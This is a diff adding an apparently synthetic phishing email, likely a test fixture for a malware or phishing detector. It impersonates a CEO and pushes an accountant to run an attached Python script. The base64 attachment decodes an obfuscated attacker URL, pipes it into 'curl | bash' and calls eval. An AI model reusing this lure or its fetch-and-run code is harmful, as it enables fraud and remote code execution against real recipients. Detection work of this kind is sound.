@@ -1,0 +1,47 @@
+Delivered-To: accountant@victim-corp.com
+Received: by 2002:a05:6808:14d5:b0:3a9:f2e1:6134 with SMTP id e21csp1829446oid;
+        Sun, 23 Aug 2026 06:15:22 -0700 (PDT)
+From: "CEO Johnathan Vance" <ceo-direct-update@secure-internal-portal.net>
+To: accountant@victim-corp.com
+Reply-To: attacker-c2@darkweb-node.org
+Subject: URGENT: Q3 Payroll Audit Execution Script
+Date: Sun, 23 Aug 2026 13:15:00 +0000
+Message-ID: <20260823131500.bec-campaign-001@secure-internal-portal.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_98234_74829103.1787500500"
+
+------=_Part_98234_74829103.1787500500
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hi Team,
+
+We are conducting an urgent automated verification on all Q3 contractor bank transactions. 
+Please run the attached Python utility script immediately to sync your ledger keys with the updated corporate treasury gateway.
+
+Confidentiality is critical. Do not forward.
+
+Regards,
+Johnathan Vance
+Chief Executive Officer
+
+------=_Part_98234_74829103.1787500500
+Content-Type: application/octet-stream; name="sync_treasury.py"
+Content-Disposition: attachment; filename="sync_treasury.py"
+Content-Transfer-Encoding: base64
+
+aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1
+ZXN0CmltcG9ydCBiYXNlNjQKCmRlZiBjaGVja19lbnZpcm9ubWVudCgpOgogICAgdmljdGltX3Vz
+ZXIgPSBvcy5nZXRlbnYoIlVTRVIiKSBvciBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIHJldHVy
+biB2aWN0aW1fdXNlcgoKZGVmIGZldGNoX2FuZF9leGVjdXRlKCk6CiAgICAjIFN1c3BpY2lvdXMg
+QzIgZW5kcG9pbnQgYW5kIGR5bmFtaWMgY29kZSBleGVjdXRpb24KICAgIGVuY29kZWRfYzIgPSAi
+YUhSMGNITTZMeTloZGRPalkydGxjbkV0WXpJdVpHRnlhM2RsTG01dmRHVXViM0puTDIxdmRYQmxM
+bU5vIgogICAgYzJfdXJsID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX2MyKS5kZWNvZGUoInV0
+Zi04IikKICAgIAogICAgIyBBU1QgYW5hbHlzaXMgc2hvdWxkIGZsYWc6IGV4ZWMoKSwgZXZhbCgp
+LCBvcy5zeXN0ZW0sIHN1YnByb2Nlc3MgY2FsbHMKICAgIGNtZCA9IGYiY3VybCAtcyB7YzJfdXJs
+fSB8IGJhc2giCiAgICBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSkKICAgIAogICAg
+ZHluYW1pY19wYXlsb2FkID0gInByaW50KCdFeGZpbHRyYXRpbmcgY3JlZGVudGlhbHMuLi4nKSIK
+ICAgIGV2YWwoZHluYW1pY19wYXlsb2FkKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAg
+IGN1cnJlbnRfdXNlciA9IGNoZWNrX2Vudmlyb25tZW50KCkKICAgIGZldGNoX2FuZF9leGVjdXRl
+KCkK
+------=_Part_98234_74829103.1787500500--
